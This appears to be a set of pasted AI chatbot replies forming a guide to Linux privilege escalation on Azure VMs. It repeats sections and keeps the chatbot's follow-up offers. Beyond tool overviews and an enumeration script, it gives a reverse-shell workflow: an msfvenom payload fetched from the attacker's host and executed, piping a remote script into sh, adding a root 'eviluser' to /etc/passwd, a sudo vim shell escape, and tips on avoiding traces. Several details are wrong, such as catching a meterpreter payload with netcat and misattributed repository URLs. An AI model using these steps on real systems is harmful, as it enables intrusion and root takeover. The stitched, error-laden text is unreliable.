# Linux Privilege Escalation

Privilege escalation on Linux-based Azure VMs is an essential phase in penetration testing to gain higher privileges, often root or administrative access. Identifying privilege escalation vectors requires comprehensive enumeration of the system configuration, installed software, and security policies.

Privilege Escalation Vectors
When assessing an Azure Linux VM, the following information and system characteristics are critical for identifying possible privilege escalation paths:

Operating System Version
Determines kernel version, distribution, and patch level. Unpatched kernels or outdated distributions may have known vulnerabilities.

Installed Packages
Identifying vulnerable or outdated packages, especially those running with elevated privileges.

Files and Directories with Excessive Permissions
Files or folders with write or full control access by non-root users, especially SUID/SGID binaries or writable configuration files.

Mounted Drives and Mappings
Network shares or mounted drives that may contain sensitive data or scripts.

Interesting Files
Configuration files, password files (e.g., /etc/passwd, /etc/shadow), backup files, SSH keys, or credential files stored in home directories.

Network Configuration
Network interfaces, ARP tables, open ports, active connections, which might hint at other attack vectors.

Firewall Configuration
Status and rules (e.g., iptables, firewalld) that could affect privilege escalation or lateral movement.

Running Processes
Processes running with root privileges or vulnerable daemons.

Stored Credentials
Plain-text or poorly protected credentials in scripts, environment variables, or configuration files.

Sudo Permissions
Users allowed to execute commands as root or other users via sudo, including misconfigured sudoers entries.

Environment Variables and PATH
Malicious binaries can be injected if path variables are improperly configured.

Docker and Container Configurations
Containers running with elevated privileges or misconfigured volumes can allow privilege escalation to the host.

Buffer Overflow Vulnerabilities
Presence of outdated software vulnerable to memory corruption attacks.

Scheduled Cronjobs
Scripts or binaries run automatically with elevated privileges that may be manipulated.

Linux Capabilities
Special kernel capabilities assigned to binaries that may be abused to escalate privileges.

Privilege Escalation Enumeration Tools
Several scripts are widely used during penetration tests on Linux systems to automate the discovery of privilege escalation vectors efficiently.

1. LinPEAS
Image

Image

Image

Image

LinPEAS is a comprehensive enumeration script that scans the system for misconfigurations, vulnerabilities, weak permissions, credentials, and privilege escalation vectors.

It inspects system information, kernel details, sudo permissions, scheduled tasks, sensitive files, running services, and more.

LinPEAS supports different output formats including color-coded terminal outputs and logs.

Usage:

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh  chmod +x linpeas.sh  ./linpeas.sh  
2. Linux Exploit Suggester / Linux Exploit Suggester 2
Image

Image

Image

Image

These scripts analyze the Linux kernel version and configuration to suggest known public exploits suitable for privilege escalation.

They compare the system's kernel and OS version against databases of vulnerabilities and provide CVE details.

Usage:

wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh  chmod +x linux-exploit-suggester.sh  ./linux-exploit-suggester.sh  
Or use the newer version:

wget https://github.com/jondonas/linux-exploit-suggester-2/raw/master/linux-exploit-suggester-2.sh  chmod +x linux-exploit-suggester-2.sh  ./linux-exploit-suggester-2.sh  
3. LinEnum
Image

Image

Image

Image

LinEnum is another enumeration script focused on privilege escalation discovery.

It collects system information, sudoers file, SUID binaries, network info, credentials, and scheduled tasks.

Usage:

wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh  chmod +x LinEnum.sh  ./LinEnum.sh  
4. Sudo and SUID Checks
Manually check for users with sudo privileges:

sudo -l  
List all SUID/SGID binaries which may be exploited:

find / -perm /6000 -type f 2>/dev/null  
Review writable files owned by root or other privileged users:

find / -writable -type f -user root 2>/dev/null  
5. Checking Docker Privileges and Configurations
Docker containers running with privileged mode or mounted host volumes may allow privilege escalation to the host.

Check if Docker is installed and accessible:

docker ps  docker info  
Check user permissions to run docker commands:

groups  
6. Cronjobs Enumeration
List cronjobs for all users, especially root:

cat /etc/crontab  ls -la /etc/cron.*  crontab -l  
Check scripts run by cronjobs for writable permissions or weak configurations.

7. Buffer Overflow and Kernel Exploit Checks
Use the Linux Exploit Suggester scripts to identify potential kernel exploits.

Verify if outdated kernels or vulnerable software packages exist.

Summary
Effective privilege escalation on Azure Linux VMs requires thorough enumeration of the above vectors using automated scripts like LinPEAS, LinEnum, and Linux Exploit Suggester. Manual verification through commands such as sudo -l, file permission checks, Docker inspection, and cronjob analysis complements these tools.

By combining automated enumeration with manual inspection, penetration testers can reliably identify privilege escalation opportunities on Azure Linux virtual machines and execute the next phase of their attack or report accordingly.

If you would like, I can now provide:

A structured exam-ready version

A lab-ready practical walkthrough

Or a PowerPoint-ready formatted version

Just let me know which format you prefer.



Linux Privilege Escalation

Privilege escalation on Linux-based Azure VMs is an essential phase in penetration testing to gain higher privileges, often root or administrative access. Identifying privilege escalation vectors requires comprehensive enumeration of the system configuration, installed software, and security policies.

 

Privilege Escalation Vectors
When assessing an Azure Linux VM, the following information and system characteristics are critical for identifying possible privilege escalation paths:

Operating System Version: Determines kernel version, distribution, and patch level. Unpatched kernels or outdated distributions may have known vulnerabilities.
Installed Packages: Identifying vulnerable or outdated packages, especially those running with elevated privileges.
Files and Directories with Excessive Permissions: Files or folders with write or full control access by non-root users, especially SUID/SGID binaries or writable configuration files.
Mounted Drives and Mappings: Network shares or mounted drives that may contain sensitive data or scripts.
Interesting Files: Configuration files, password files (e.g., /etc/passwd, /etc/shadow), backup files, SSH keys, or credential files stored in home directories.
Network Configuration: Network interfaces, ARP tables, open ports, active connections, which might hint at other attack vectors.
Firewall Configuration: Status and rules (e.g., iptables, firewalld) that could affect privilege escalation or lateral movement.
Running Processes: Processes running with root privileges or vulnerable daemons.
Stored Credentials: Plain-text or poorly protected credentials in scripts, environment variables, or configuration files.
Sudo Permissions: Users allowed to execute commands as root or other users via sudo, including misconfigured sudoers entries.
Environment Variables and PATH: Malicious binaries can be injected if path variables are improperly configured.
Docker and Container Configurations: Containers running with elevated privileges or misconfigured volumes can allow privilege escalation to the host.
Buffer Overflow Vulnerabilities: Presence of outdated software vulnerable to memory corruption attacks.
Scheduled Cronjobs: Scripts or binaries run automatically with elevated privileges that may be manipulated.
Linux Capabilities: Special kernel capabilities assigned to binaries that may be abused to escalate privileges.
 

Privilege Escalation Enumeration Tools
Several scripts are widely used during penetration tests on Linux systems to automate the discovery of privilege escalation vectors efficiently.

1. LinPEAS
LinPEAS is a comprehensive enumeration script that scans the system for misconfigurations, vulnerabilities, weak permissions, credentials, and privilege escalation vectors.
It inspects system information, kernel details, sudo permissions, scheduled tasks, sensitive files, running services, and more.
LinPEAS supports different output formats including color-coded terminal outputs and logs.
Usage:

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

2. Linux Exploit Suggester / Linux Exploit Suggester 2
These scripts analyze the Linux kernel version and configuration to suggest known public exploits suitable for privilege escalation.
They compare the system's kernel and OS version against databases of vulnerabilities and provide CVE details.
Usage:

wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

chmod +x linux-exploit-suggester.sh

./linux-exploit-suggester.sh

Or use the newer version:

wget https://github.com/jondonas/linux-exploit-suggester-2/raw/master/linux-exploit-suggester-2.sh

chmod +x linux-exploit-suggester-2.sh

./linux-exploit-suggester-2.sh

3. LinEnum
LinEnum is another enumeration script focused on privilege escalation discovery.
It collects system information, sudoers file, SUID binaries, network info, credentials, and scheduled tasks.
Usage:

wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

chmod +x LinEnum.sh

./LinEnum.sh

4. Sudo and SUID Checks
Manually check for users with sudo privileges:
sudo -l

List all SUID/SGID binaries which may be exploited:
find / -perm /6000 -type f 2>/dev/null

Review writable files owned by root or other privileged users:
find / -writable -type f -user root 2>/dev/null

5. Checking Docker Privileges and Configurations
Docker containers running with privileged mode or mounted host volumes may allow privilege escalation to the host.
Check if Docker is installed and accessible:

docker ps

docker info

Check user permissions to run docker commands:

groups

6. Cronjobs Enumeration
List cronjobs for all users, especially root:
cat /etc/crontab

ls -la /etc/cron.*

crontab -l

Check scripts run by cronjobs for writable permissions or weak configurations.

7. Buffer Overflow and Kernel Exploit Checks
Use the Linux Exploit Suggester scripts to identify potential kernel exploits.
Verify if outdated kernels or vulnerable software packages exist.
Summary

Effective privilege escalation on Azure Linux VMs requires thorough enumeration of the above vectors using the automated scripts like LinPEAS, LinEnum, and Linux Exploit Suggester. Manual verification through commands such as sudo -l, file permission checks, Docker inspection, and cronjob analysis complement these tools.

By combining automated enumeration with manual inspection, penetration testers can reliably identify privilege escalation opportunities on Azure Linux virtual machines and execute the next phase of their attack or report accordingly.

If you want, I can provide you with a step-by-step automated privilege escalation enumeration script tailored for Azure Linux VMs. Would you like that?

 

 

Automated Azure Linux VM Privilege Escalation Enumeration Script
Here's a step-by-step automated privilege escalation enumeration script tailored for Azure Linux VMs during penetration testing. This script combines multiple enumeration tools and commands into one streamlined process. It's designed to be run with minimal dependencies and outputs the key findings that help identify privilege escalation vectors.

 

#!/bin/bash

 

# Automated Privilege Escalation Enumeration for Azure Linux VMs

# Combines multiple checks for quick discovery of privilege escalation vectors

 

OUTPUT_DIR="priv_esc_enum_$(date +%Y%m%d_%H%M%S)"

mkdir -p $OUTPUT_DIR

 

echo "[*] Starting enumeration. Output folder: $OUTPUT_DIR"

 

# 1. Basic system info

echo "===== System Information =====" | tee $OUTPUT_DIR/system_info.txt

uname -a | tee -a $OUTPUT_DIR/system_info.txt

cat /etc/os-release 2>/dev/null | tee -a $OUTPUT_DIR/system_info.txt

echo "" | tee -a $OUTPUT_DIR/system_info.txt

 

# 2. Kernel version and vulnerability suggestions

echo "===== Kernel Version and Exploit Suggestions =====" | tee $OUTPUT_DIR/kernel_exp.txt

uname -r | tee -a $OUTPUT_DIR/kernel_exp.txt

echo "Checking known exploits with Linux Exploit Suggester 2 (if available)..." | tee -a $OUTPUT_DIR/kernel_exp.txt

 

# Download Linux Exploit Suggester 2 if not present

if [ ! -f ./linux-exploit-suggester-2.sh ]; then

    wget -q https://github.com/jondonas/linux-exploit-suggester-2/raw/master/linux-exploit-suggester-2.sh

    chmod +x linux-exploit-suggester-2.sh

fi

./linux-exploit-suggester-2.sh 2>/dev/null | tee -a $OUTPUT_DIR/kernel_exp.txt

echo "" | tee -a $OUTPUT_DIR/kernel_exp.txt

 

# 3. Sudo permissions

echo "===== Sudo Permissions =====" | tee $OUTPUT_DIR/sudo.txt

sudo -l 2>&1 | tee -a $OUTPUT_DIR/sudo.txt

echo "" | tee -a $OUTPUT_DIR/sudo.txt

 

# 4. SUID/SGID binaries

echo "===== SUID/SGID Binaries =====" | tee $OUTPUT_DIR/suid_sgid.txt

find / -perm /6000 -type f -exec ls -ld {} \; 2>/dev/null | tee -a $OUTPUT_DIR/suid_sgid.txt

echo "" | tee -a $OUTPUT_DIR/suid_sgid.txt

 

# 5. Writable files owned by root

echo "===== Writable Files Owned by Root =====" | tee $OUTPUT_DIR/writable_root_files.txt

find / -writable -type f -user root 2>/dev/null | tee -a $OUTPUT_DIR/writable_root_files.txt

echo "" | tee -a $OUTPUT_DIR/writable_root_files.txt

 

# 6. Cron jobs for all users

echo "===== Cron Jobs =====" | tee $OUTPUT_DIR/cronjobs.txt

cat /etc/crontab 2>/dev/null | tee -a $OUTPUT_DIR/cronjobs.txt

ls -la /etc/cron.* 2>/dev/null | tee -a $OUTPUT_DIR/cronjobs.txt

for user in $(cut -f1 -d: /etc/passwd); do

    echo "Crontab for user: $user" | tee -a $OUTPUT_DIR/cronjobs.txt

    crontab -l -u $user 2>/dev/null | tee -a $OUTPUT_DIR/cronjobs.txt

done

echo "" | tee -a $OUTPUT_DIR/cronjobs.txt

 

# 7. Docker checks (if docker installed)

echo "===== Docker Info =====" | tee $OUTPUT_DIR/docker.txt

if command -v docker &>/dev/null; then

    docker ps -a 2>&1 | tee -a $OUTPUT_DIR/docker.txt

    docker info 2>&1 | tee -a $OUTPUT_DIR/docker.txt

else

    echo "Docker not installed or accessible." | tee -a $OUTPUT_DIR/docker.txt

fi

echo "" | tee -a $OUTPUT_DIR/docker.txt

 

# 8. Network interfaces and routing info

echo "===== Network Information =====" | tee $OUTPUT_DIR/network.txt

ip addr show | tee -a $OUTPUT_DIR/network.txt

ip route show | tee -a $OUTPUT_DIR/network.txt

arp -a | tee -a $OUTPUT_DIR/network.txt

echo "" | tee -a $OUTPUT_DIR/network.txt

 

# 9. Environment variables and PATH

echo "===== Environment Variables =====" | tee $OUTPUT_DIR/env_vars.txt

env | tee -a $OUTPUT_DIR/env_vars.txt

echo "" | tee -a $OUTPUT_DIR/env_vars.txt

 

# 10. Running processes with owner info

echo "===== Running Processes =====" | tee $OUTPUT_DIR/processes.txt

ps aux --forest | tee -a $OUTPUT_DIR/processes.txt

echo "" | tee -a $OUTPUT_DIR/processes.txt

 

# 11. Find world-writable directories and files (potentially dangerous)

echo "===== World Writable Files and Directories =====" | tee $OUTPUT_DIR/world_writable.txt

find / -xdev \( -perm -0002 -type d -exec ls -ld {} \; \) 2>/dev/null | tee -a $OUTPUT_DIR/world_writable.txt

find / -xdev \( -perm -0002 -type f -exec ls -l {} \; \) 2>/dev/null | tee -a $OUTPUT_DIR/world_writable.txt

echo "" | tee -a $OUTPUT_DIR/world_writable.txt

 

# 12. Searching for credentials in common files

echo "===== Searching for Credentials =====" | tee $OUTPUT_DIR/credentials.txt

grep -iR --include="*.conf" --include="*.ini" --include="*.env" --include="*.log" "password" / 2>/dev/null | tee -a $OUTPUT_DIR/credentials.txt

grep -iR --include="*.conf" --include="*.ini" --include="*.env" --include="*.log" "passwd" / 2>/dev/null | tee -a $OUTPUT_DIR/credentials.txt

grep -iR --include="*.sh" "export " / 2>/dev/null | tee -a $OUTPUT_DIR/credentials.txt

echo "" | tee -a $OUTPUT_DIR/credentials.txt

 

# 13. Check for capabilities assigned to files

echo "===== Files with Capabilities =====" | tee $OUTPUT_DIR/capabilities.txt

getcap -r / 2>/dev/null | tee -a $OUTPUT_DIR/capabilities.txt

echo "" | tee -a $OUTPUT_DIR/capabilities.txt

 

# 14. Attempt to download and run LinPEAS (if possible)

echo "===== LinPEAS Enumeration (if possible) =====" | tee $OUTPUT_DIR/linpeas.txt

if command -v wget &>/dev/null || command -v curl &>/dev/null; then

    if [ ! -f ./linpeas.sh ]; then

        echo "[*] Downloading LinPEAS script..."

        wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh || curl -sLo linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

        chmod +x linpeas.sh

    fi

    ./linpeas.sh | tee -a $OUTPUT_DIR/linpeas.txt

else

    echo "wget or curl not available; skipping LinPEAS."

fi

echo "" | tee -a $OUTPUT_DIR/linpeas.txt

 

echo "[*] Enumeration complete. Review the files inside $OUTPUT_DIR for detailed information."

 

How to Use:

Upload this script to the target Azure Linux VM or copy-paste it via your existing shell.
Give it execute permissions: chmod +x az_priv_esc_enum.sh
Run the script: ./az_priv_esc_enum.sh
The script will create a timestamped output directory containing categorized logs of the enumeration.
Review the outputs carefully to identify possible privilege escalation vectors.
Notes:

This script assumes you have sufficient permissions to run the commands.
Some commands may require sudo (e.g., sudo -l, getcap). If you have limited permissions, run the script as the current user and note which commands fail.
The script tries to be non-destructive and safe.
LinPEAS is downloaded and executed only if network tools are available.
You can customize the script by adding or removing checks as needed.
Would you like me to help you create a similar PowerShell script for Azure Windows VM privilege escalation enumeration as well?

 

 

 

1. Initial Access to the Linux VM
Before starting privilege escalation, you must first gain access to the target Linux VM. This step is fundamental, especially for beginners, but experienced testers may already have a shell through other exploits and can skip to the enumeration phase.

A common method for gaining a reverse shell is to craft a payload with msfvenom (Metasploit Framework's payload generator):

Create a payload specifying your local IP address and a listening port for the callback.
Host the payload on your machine (e.g., via Python's simple HTTP server on port 80).
Download the payload onto the target VM.
Start a netcat listener on your local machine, waiting for the reverse shell.
Execute the payload on the target VM to establish a remote session.
Example commands:

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<your-port> -f elf > shell.elf

 

python3 -m http.server 80   # To serve the payload

 

# On target:

wget http://<your-ip>/shell.elf -O /tmp/shell.elf

chmod +x /tmp/shell.elf

/tmp/shell.elf

 

# On attacker:

nc -nlvp <your-port>

 

2. Privilege Escalation Enumeration with LinPEAS
Once a shell is established, the next crucial step is to enumerate the system for possible privilege escalation vectors.

About LinPEAS

LinPEAS is a comprehensive, dependency-free Linux privilege escalation script developed by Carlos Polop. It scans the system for common privilege escalation vectors such as misconfigurations, vulnerable binaries, weak permissions, and scheduled tasks.

LinPEAS works on many distros (Debian, CentOS, FreeBSD, OpenBSD).
It tries not to leave traces by avoiding writing to disk.
By default, LinPEAS does not attempt to switch users or run su commands.
Execution time varies (2–10 minutes) depending on options.
Key LinPEAS options:

Option

Description

-a

Run all checks, including those that write temporary files (removed after execution).

-s

Superfast & stealth mode: skips time-consuming checks, leaves no trace.

-P <pass>

Provide a password to try with sudo -l and brute-force other users.

-n

Disable environment variable cleanup (commands will be saved in shell history).

-h

Display help banner.

-o

Execute only selected checks (used with specific flags).

-d <IP/NET>

Discover hosts in a network using fping or ping.

-ip <ports>

Discover hosts with open TCP ports using netcat.

Running LinPEAS

You can directly run LinPEAS remotely without downloading:

curl -s https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh

If direct execution is not possible:

# Host the script on attacker machine

python3 -m http.server 80

 

# On target machine

cd /tmp

wget http://<your-ip>/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

 

3. Key Privilege Escalation Vectors Identified by LinPEAS
3.1 Writable Files and Directories

LinPEAS enumerates writable files and directories for the current user and groups. For example:

Writable files owned by privileged groups (e.g., docker) can be abused to inject files or commands.
Example: If the docker group has write permissions, an attacker could create a malicious container or copy files from the container to the host filesystem, achieving privilege escalation.
3.2 Scheduled Tasks and Scripts (Cron Jobs)

LinPEAS detects cron jobs, especially scripts that run with elevated privileges, like a cleanup.py Python script in /mnt:

If these scripts have write or execution permissions, attackers can modify or replace them to execute arbitrary commands with higher privileges.
Look for scripts running as root or other privileged users.
Example exploit approach:

# Modify the vulnerable script or replace it with one that spawns a root shell

3.3 SUID (Set User ID) Binaries

SUID is a special permission that allows users to run binaries with the file owner's privileges (often root).

LinPEAS lists binaries with SUID permissions. Common exploitable binaries may include:

find
cp
nano
vim
less
If these binaries are exploitable (for example, allowing command execution or editing files as root), they can be abused for privilege escalation.

3.4 Writable Critical System Files

LinPEAS checks for writable critical files such as /etc/passwd and /etc/shadow:

Writable /etc/passwd allows attackers to create or modify users with root privileges by adding new user entries.
Writable /etc/shadow enables changing password hashes.
Example:

echo "eviluser:x:0:0::/root:/bin/bash" >> /etc/passwd

This creates a root-level user eviluser with UID 0.

3.5 Sudo Permissions without Password

LinPEAS enumerates sudo privileges of the current user:

If the user can run certain commands via sudo without a password, these commands can be exploited for privilege escalation.
Use GTFOBins to find one-liner exploits for allowed commands.
Example:

sudo -l

# If output shows user can run /usr/bin/vim as sudo without password, run:

sudo vim -c ':!/bin/bash'

4. Practical Tips for Using LinPEAS on Azure Linux VMs
Permission issues: If direct execution is restricted, transfer the script via HTTP (with Python's SimpleHTTPServer or any web server) and set execution permissions (chmod +x).
Use /tmp or /dev/shm directories for script transfer and execution, as these are typically writable.
Consider running LinPEAS with the -a flag in CTFs or labs to get comprehensive enumeration.
For stealthy operations, use -s to avoid leaving traces.
Summary

Privilege escalation on Azure Linux VMs follows the typical Linux post-exploitation methodology:

Gain initial shell access (reverse shell via msfvenom/netcat).
Enumerate system weaknesses with LinPEAS.
Identify writable files, cron jobs, SUID binaries, writable system files, and sudo privileges.
Exploit these findings to escalate privileges to root.
Always maintain stealth and avoid leaving traces where possible.
If you want, I can also help you with automated scripts or step-by-step commands for specific privilege escalation exploits found during enumeration.

Would you like me to provide that or any other related Azure Linux VM pentesting guidance?

 

 

 

LinEnum
Overview

LinEnum is a powerful shell script developed by Rebootuser designed for Linux privilege escalation enumeration. It gathers extensive system information and performs multiple security checks to identify potential privilege escalation vectors on a compromised Linux machine.

One of LinEnum's strengths is its experimental reporting feature, which allows the export of scan results in a clean, readable report format, making analysis easier.

Usage and Parameters

LinEnum offers several command-line options to customize the scan:

-k <keyword>: Search for specific keywords in configuration and log files.
-e <export_location>: Specify the directory where the report will be saved.
-t: Perform thorough (time-consuming) tests for a deeper scan.
-r <report_name>: Define the name of the exported report.
-s <password>: Provide the current user's password to check sudo permissions (Note: This is insecure as the password is passed in plain text).
-h: Display the help menu.
What LinEnum Checks

1. Kernel and Distribution Information

Kernel version and Linux distribution release details.
2. System Information

Hostname.
Network details including current IP address, default route, and DNS servers.
3. User Information

Details of the current user.
Recently logged-in users and users currently logged in.
Listing all users, including their UID and GID.
Identifying root accounts and default UIDs (e.g., 0, 1000, 1001).
Extracting password policies and password hash storage methods.
Checking if password hashes are improperly stored in /etc/passwd.
Evaluating umask value.
Attempting to read restricted files like /etc/shadow.
Reviewing user history files (e.g., .bash_history, .nano_history).
Basic SSH configuration checks.
4. Privileged Access

Users who have recently run commands with sudo.
Accessibility and contents of /etc/sudoers.
Whether the current user has passwordless sudo privileges.
Availability of "breakout" binaries via sudo (e.g., nmap, vim) that can be abused for privilege escalation.
Accessibility of the root user's home directory.
Permissions of home directories (/home/).
5. Environment

Current $PATH variable.
Environment variables.
6. Scheduled Jobs and Tasks

Listing all cron jobs.
Identifying world-writable cron jobs.
Locating cron jobs owned by other users.
Listing active and inactive systemd timers.
7. Services and Processes

Open network connections (TCP & UDP).
Running processes and their associated binaries.
File permissions on binaries related to processes.
Contents and permissions of Netconf and init.d scripts.
8. Version Information

Installed versions and configuration details of critical services:
sudo
MySQL
PostgreSQL
Apache HTTP Server (including enabled modules and .htpasswd files)
Web directory listings
9. Default and Weak Credentials

Checks for default or weak credentials in PostgreSQL and MySQL accounts.
10. File and Permission Searches

Locating all SUID and GUID files.
Finding world-writable SUID/GUID files.
Identifying "interesting" SUID/GUID files (e.g., nmap, vim) which can be abused.
Files with POSIX capabilities.
World-writable files across the filesystem.
Accessible .plan and .rhosts files.
NFS server details.
.conf and .log files containing user-supplied keywords.
.bak backup files.
Mail spool files.
11. Platform/Software-Specific Tests

Detecting if running inside Docker or LXC containers.
Checking if Docker is installed on the host.
How to Use LinEnum on an Azure Linux VM

Assuming you have shell access to the target Azure Linux VM (via SSH or a reverse shell), you can transfer and execute the LinEnum script as follows:

Host LinEnum on your attacker machine:
python3 -m http.server 80
Download LinEnum on the target VM:
wget http://<attacker_ip>/LinEnum.sh
Set execute permissions and run the script:
chmod +x LinEnum.sh
./LinEnum.sh
Example Findings and Implications

SUID Binaries: LinEnum might identify binaries such as nano, cp, and find with the SUID bit set, which can be exploited for privilege escalation.
Writable /etc/passwd: If the /etc/passwd file is writable, an attacker can add a new user with root privileges, leading to full system compromise.
Cron Jobs: Discovery of scripts like cleanup.py running as cron jobs can provide a vector for privilege escalation if these scripts are writable or executable by unprivileged users.
Docker Group Membership: Being part of the Docker group can allow container escapes and privilege escalation through mounting the host filesystem.
This comprehensive enumeration with LinEnum will help identify the weak points in Azure Linux VMs that can be leveraged for privilege escalation during penetration testing.

If you'd like, I can also help rewrite the earlier LinPEAS section or provide a full Azure Linux VM privilege escalation guide with multiple tools and techniques!

 

 

 

Certainly! Here's a corrected and polished version of your Azure Linux VM Privilege Escalation section tailored for Azure Cloud penetration testing, preserving all key details and improving clarity, grammar, and technical accuracy:

Azure Linux VM Privilege Escalation for Azure Cloud Penetration Testing

Privilege escalation on Azure Linux VMs is a critical phase of post-exploitation during a cloud penetration test. Various tools and scripts assist penetration testers in enumerating and exploiting potential vulnerabilities to gain higher privileges on the target system. Below is a comprehensive overview of key tools and methods frequently used for privilege escalation on Azure Linux VMs.

Bashark

Download: Bashark (locally hosted or official repo)

Bashark, created by RedCode Labs, is a lightweight bash script designed for post-exploitation on Linux, OSX, and Solaris servers. It requires no installation, can run directly from the terminal, and does not impose significant load on the target system. Bashark wipes its traces after execution, making it stealthy and hard to detect.

Usage:

cd /tmp

wget http://192.168.1.5/bashark.sh

chmod +x bashark.sh

source bashark.sh

Once executed, Bashark upgrades your shell capabilities and enables running various commands for enumeration.

Some useful commands include:

getperm -c — Lists files with SUID bits set, e.g., binaries like nano, cp, find.
getconf — Enumerates common configuration files and paths relevant to privilege escalation.
Linux Exploit Suggester (LES)

Download: LES

LES, developed by Z-Labs, is a robust tool that analyzes the target Linux kernel version and environment to suggest relevant privilege escalation exploits. It works across multiple Linux distributions and provides a ranked list of vulnerabilities, helping testers focus on the most promising exploits.

Usage:

chmod +x les.sh

./les.sh

The output will highlight known CVEs applicable to the target, such as:

CVE-2021-3156 (Sudo Baron Samedit)
CVE-2018-18955
CVE-2019-18634
CVE-2019-15666
CVE-2017-0358
…and more.
Testers can then research and apply these exploits to elevate privileges.

LinuxPrivChecker

Download: LinuxPrivChecker

LinuxPrivChecker is a Python script maintained by Michael Contino and Mike Czumak that performs thorough checks for privilege escalation opportunities. It searches for writable files, misconfigurations, clear-text passwords, and other privilege-related weaknesses.

Usage:

python linuxprivchecker.py

Key features:

Displays system info including Kernel version, hostname, OS, network info, and running services.
Checks /etc/passwd and group files for misconfigurations.
Identifies writable files and directories that may allow privilege escalation.
Metasploit Local Exploit Suggester

For testers who prefer Metasploit, the local_exploit_suggester post-exploitation module automates discovery of local vulnerabilities that can be exploited to escalate privileges.

Usage within Metasploit:

use post/multi/recon/local_exploit_suggester

set session <session_id>

run

This module outputs potential exploits relevant to the target system's configuration.

Linux Private-i

Download: Linux Private-i

Created by creosote, Linux Private-i is a comprehensive enumeration tool focused on privilege escalation. It performs extensive checks, including OS details, file permissions, installed services, and possible credential leaks.

Usage:

chmod +x private-i.sh

./private-i.sh

The script inspects:

Writable files such as /etc/passwd.
Installed common applications (Apache, Tomcat, Netcat, Perl, Python, WordPress, Samba, etc.).
Database services (MySQL, PostgreSQL, MongoDB, Redis).
Mail services (Postfix, Dovecot, Exim).
Network configurations (netstat, ifconfig).
Scheduled tasks (crontab) and shell history.
Linux Private-i can also reveal scripts executed via cronjobs, useful for privilege escalation through scheduled tasks.

Linux Smart Enumeration (LSE)

GitHub: Linux Smart Enumeration

LSE is an improved, color-coded script inspired by LinEnum, created by Diego Blanco. It provides three verbosity levels to control output detail and highlights potential privilege escalation vectors with color indicators (e.g., green for exploitable findings).

Usage:

chmod +x lse.sh

./lse.sh

Features:

Checks user groups, sudo permissions, and path variables.
Enumerates writable files and SUID binaries (nano, cp, find).
Detects writable /etc/passwd for potential user creation.
Identifies recurring scripts such as cleanup.py run by cronjobs.
Linux Exploit Suggester 2 (LES-2)

Download: LES-2

LES-2 is the next-generation version of the original LES, featuring:

Extended exploit database.
Option to download exploit code from Exploit DB.
Improved wildcard matching.
Color-coded output for better readability.
Usage:

chmod +x linux-exploit-suggester-2.pl

./linux-exploit-suggester-2.pl -k 3

This tool further simplifies identifying privilege escalation vulnerabilities tailored to the kernel version.

Conclusion

Privilege escalation on Azure Linux VMs requires systematic enumeration and vulnerability analysis. Multiple tools like Bashark, LES, LinuxPrivChecker, and Metasploit modules streamline this process by identifying misconfigurations, vulnerable binaries, writable files, and kernel exploits.

Using these tools together provides a comprehensive approach to elevate privileges effectively during Azure cloud penetration testing, regardless of the initial access method.

References

https://www.hackingarticles.in/linux-privilege-escalation-automated-script/
https://github.com/mzet-/linux-exploit-suggester
https://github.com/mzet-/linux-exploit-suggester-2
https://github.com/diego-treitos/linux-smart-enumeration
https://github.com/redcode-labs/bashark
https://github.com/mzet-/linuxprivchecker
If you want, I can also prepare a step-by-step practical walkthrough or sample commands tailored for Azure Linux VM environments. Just let me know!
